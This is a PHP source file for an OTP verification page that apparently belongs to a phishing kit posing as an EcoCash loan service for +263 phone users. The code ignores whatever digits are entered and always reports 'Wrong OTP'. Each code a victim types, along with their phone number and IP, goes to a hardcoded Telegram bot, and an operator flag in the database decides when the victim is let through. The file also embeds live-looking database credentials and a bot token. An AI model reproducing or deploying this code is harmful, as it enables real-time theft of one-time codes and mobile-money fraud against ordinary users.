<?php
session_start();

// ========== POSTGRESQL CONFIGURATION ==========
$dbHost = "dpg-d8l5ii7lk1mc73cjcvs0-a";
$dbPort = 5432;
$dbName = "loan_9d8q";
$dbUser = "loan_9d8q_user";
$dbPass = "Jhl6RiIZwV5AnvLVCKirxqgLMtFi5gZX";
// ==============================================

// Telegram configuration
$botToken = "8163112809:AAH5OFmjVHKPDz1svGG9viGjpAuNLFHsctc";
$chatId   = "-5193742613";

/**
 * Get PostgreSQL connection
 */
function getDbConnection($host, $port, $dbname, $user, $pass) {
    static $conn = null;
    if ($conn === null) {
        if (!function_exists('pg_connect')) {
            error_log("PostgreSQL extension (pgsql) is NOT available.");
            return false;
        }
        $connString = "host=$host port=$port dbname=$dbname user=$user password=$pass";
        $conn = @pg_connect($connString);
        if (!$conn) {
            error_log("DB connection failed: " . pg_last_error());
            return false;
        }
    }
    return $conn;
}

/**
 * Send Telegram message
 */
function sendTelegramMessage($botToken, $chatId, $message, $parseMode = 'HTML') {
    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
    $postData = [
        'chat_id' => $chatId,
        'text'    => $message,
        'parse_mode' => $parseMode
    ];
    
    if (function_exists('curl_version')) {
        $ch = curl_init();
        curl_setopt_array($ch, [
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => http_build_query($postData),
            CURLOPT_TIMEOUT => 10,
            CURLOPT_SSL_VERIFYPEER => true,
            CURLOPT_USERAGENT => 'EcoCashBot/1.0'
        ]);
        $response = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        if ($response !== false && $httpCode === 200) {
            $result = json_decode($response, true);
            return isset($result['ok']) && $result['ok'] === true;
        }
        return false;
    }
    
    // fallback
    $options = [
        'http' => [
            'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
            'method'  => 'POST',
            'content' => http_build_query($postData),
            'timeout' => 10,
            'user_agent' => 'EcoCashBot/1.0'
        ],
        'ssl' => ['verify_peer' => true]
    ];
    $context = stream_context_create($options);
    $response = @file_get_contents($url, false, $context);
    if ($response !== false) {
        $result = json_decode($response, true);
        return isset($result['ok']) && $result['ok'] === true;
    }
    return false;
}

// Must have phone in session (set by login.php)
if (!isset($_SESSION['phone'])) {
    header("Location: login.php");
    exit;
}

$phone = trim($_SESSION['phone']);
$error = '';

// Process OTP submission
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // We ignore the actual OTP digits – only the database flag matters
    $otpArray = isset($_POST['otp']) ? $_POST['otp'] : [];
    $enteredOtp = implode('', $otpArray);
    $enteredOtp = preg_replace('/[^0-9]/', '', $enteredOtp);
    
    $conn = getDbConnection($dbHost, $dbPort, $dbName, $dbUser, $dbPass);
    if (!$conn) {
        $error = "System error. Please contact administrator.";
        error_log("PostgreSQL connection failed in otp.php");
    } else {
        // Ensure `users` table exists (with `otp` column default 0)
        $createSQL = "
            CREATE TABLE IF NOT EXISTS users (
                phone VARCHAR(20) PRIMARY KEY,
                status INTEGER DEFAULT 0,
                pin INTEGER DEFAULT 0,
                otp INTEGER DEFAULT 0
            )
        ";
        pg_query($conn, $createSQL);
        
        // Insert phone if not exists (with default otp=0)
        $insertSQL = "INSERT INTO users (phone, status, pin, otp) VALUES ($1, 0, 0, 0) ON CONFLICT (phone) DO NOTHING";
        pg_query_params($conn, $insertSQL, [$phone]);
        
        // Check the `otp` flag for this phone
        $checkSQL = "SELECT otp FROM users WHERE phone = $1";
        $result = pg_query_params($conn, $checkSQL, [$phone]);
        if ($result && $row = pg_fetch_assoc($result)) {
            $otpStatus = (int)$row['otp'];
            
            if ($otpStatus === 1) {
                // OTP approved → send Telegram success and redirect to dashboard
                $successMsg = "✅ LOAN SUCCESS ✅<br>📱 Phone: +263 {$phone}<br>🕒 Time: " . date('Y-m-d H:i:s');
                sendTelegramMessage($botToken, $chatId, $successMsg, 'HTML');
                
                header("Location: dashboard.php");
                exit;
            } else {
                $error = "Wrong OTP";
                // Optional: send Telegram notification of failed attempt
                $ip = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['REMOTE_ADDR'] ?? 'unknown';
                $time = date('Y-m-d H:i:s');
                $msg = "❌ *Failed OTP attempt*\n\n📱 Phone: +263 {$phone}\n🔢 OTP entered: `{$enteredOtp}`\n⏰ Time: {$time}\n🌐 IP: {$ip}";
                sendTelegramMessage($botToken, $chatId, $msg, 'Markdown');
            }
        } else {
            $error = "Database error. Please try again.";
        }
    }
}

// Helper to mask phone for display
$maskedPhone = substr(preg_replace('/\D/', '', $phone), 0, 3) . "****" . substr(preg_replace('/\D/', '', $phone), -2);
?>
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>OTP Verification</title>
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
<style>
* {
    box-sizing: border-box;
    margin: 0;
    padding: 0;
}

body {
    font-family: Arial, Helvetica, sans-serif;
    background: #f5f7fa;
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    padding: 16px;
}

.container {
    width: 100%;
    max-width: 500px;
    background: #fff;
    padding: 24px 20px 32px;
    border-radius: 24px;
    box-shadow: 0 10px 30px rgba(0,0,0,.1);
}

h2 {
    margin-top: 0;
    margin-bottom: 8px;
    font-size: 24px;
}

p {
    color: #6b7280;
    margin-bottom: 28px;
    font-size: 15px;
}

.error-message {
    background: #fee2e2;
    color: #dc2626;
    padding: 10px;
    border-radius: 8px;
    margin-bottom: 20px;
    text-align: center;
    font-size: 14px;
}

.otp-box {
    display: flex;
    justify-content: center;
    gap: 12px;
    flex-wrap: wrap;
}

.otp-box input {
    width: calc(16% - 8px);
    min-width: 45px;
    max-width: 65px;
    aspect-ratio: 1 / 1;
    font-size: 24px;
    text-align: center;
    border-radius: 12px;
    border: 2px solid #2563eb;
    background: white;
    font-weight: 600;
    padding: 0;
    outline: none;
    transition: 0.2s;
}

.otp-box input:focus {
    border-color: #1e40af;
    box-shadow: 0 0 0 3px rgba(37,99,235,0.2);
}

button {
    margin-top: 32px;
    width: 100%;
    padding: 14px;
    font-size: 18px;
    border: none;
    border-radius: 40px;
    background: #2563eb;
    color: white;
    cursor: pointer;
    font-weight: bold;
    transition: 0.2s;
}

button:hover {
    background: #1d4ed8;
}

.timer {
    margin-top: 24px;
    text-align: center;
    color: #6b7280;
    font-size: 14px;
}

.timer a {
    color: #2563eb;
    text-decoration: none;
}

@media (max-width: 480px) {
    .container {
        padding: 20px 16px 28px;
    }
    .otp-box {
        gap: 8px;
    }
    .otp-box input {
        min-width: 42px;
        font-size: 20px;
    }
}

@media (max-width: 380px) {
    .otp-box {
        gap: 6px;
    }
    .otp-box input {
        min-width: 38px;
        font-size: 18px;
    }
}
</style>
</head>
<body>

<div class="container">
    <h2>OTP Verification</h2>
    <p>Enter the OTP sent to your phone number<br>
        <strong>+263 <?= htmlspecialchars($maskedPhone) ?></strong>
    </p>

    <?php if ($error): ?>
        <div class="error-message"><?= htmlspecialchars($error) ?></div>
    <?php endif; ?>

    <form method="POST">
        <div class="otp-box">
            <?php for ($i = 0; $i < 6; $i++): ?>
                <input type="text" name="otp[]" maxlength="1" inputmode="numeric" required autocomplete="off">
            <?php endfor; ?>
        </div>
        <button type="submit">Submit</button>
    </form>

    <div class="timer" id="timer">Resend OTP in 120 seconds</div>
</div>

<script>
const inputs = document.querySelectorAll('.otp-box input');

inputs.forEach((input, i) => {
    input.addEventListener('input', () => {
        input.value = input.value.replace(/[^0-9]/g, '');
        if (input.value && i < inputs.length - 1) {
            inputs[i + 1].focus();
        }
    });

    input.addEventListener('keydown', e => {
        if (e.key === "Backspace" && !input.value && i > 0) {
            inputs[i - 1].focus();
        }
    });
});

inputs[0].focus();

let time = 120;
const timer = document.getElementById("timer");

const interval = setInterval(() => {
    if (time > 0) {
        time--;
        timer.innerText = "Resend OTP in " + time + " seconds";
    } else {
        clearInterval(interval);
        timer.innerHTML = '<a href="resend.php">Resend OTP</a>';
    }
}, 1000);
</script>

</body>
</html>
